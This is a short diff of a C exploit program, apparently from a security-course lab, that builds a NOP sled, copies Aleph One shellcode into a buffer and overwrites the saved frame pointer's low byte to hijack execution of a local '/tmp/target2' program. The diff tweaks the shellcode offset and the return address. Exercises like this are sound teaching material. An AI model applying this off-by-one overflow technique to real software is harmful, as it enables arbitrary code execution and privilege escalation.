@@ -4,8 +4,8 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target2"
-#define NOOP 0x90
+#define TARGET 	"/tmp/target2"
+#define NOOP 	0x90
 
 int main(void)
 {
@@ -18,10 +18,10 @@ int main(void)
   memset(buf, NOOP, 241);
 
   //2. add shellcode from alephone
-  strncpy(buf + 190, shellcode, 45);
+  strncpy(buf + 180, shellcode, 45);
 
   //3. new EIP after modifying least significant byte of SFP. This is our landing address somewhere in buffer. 
-  strncpy(buf + 236, "\x10", 1);
+  strncpy(buf + 236, "\x20", 1);
   strncpy(buf + 237, "\xfd", 1);
   strncpy(buf + 238, "\xff", 1);
   strncpy(buf + 239, "\xbf", 1);
